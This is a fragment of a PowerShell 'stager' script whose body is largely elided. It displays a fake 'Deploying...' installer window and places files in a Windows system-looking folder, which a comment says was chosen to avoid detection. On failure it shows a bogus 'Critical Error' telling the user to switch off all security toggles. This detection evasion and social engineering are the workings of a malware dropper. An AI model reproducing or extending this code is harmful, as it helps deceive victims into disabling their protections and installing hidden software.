# --- [RESEARCH STAGER v45.0: HARDENED LOGIC] ---
...
function Run-Deployment {
    ...
    $form.Text = "Deploying..."; $form.Size = New-Object Drawing.Size(400,180); $form.StartPosition = "CenterScreen"
    ...
    try {
        ...
        $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync" # Changed path slightly to avoid common detection
        ...
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Error: Installation blocked by system. Please ensure ALL Security toggles are OFF.", "Critical Error", 0, 16) | Out-Null
    }
}
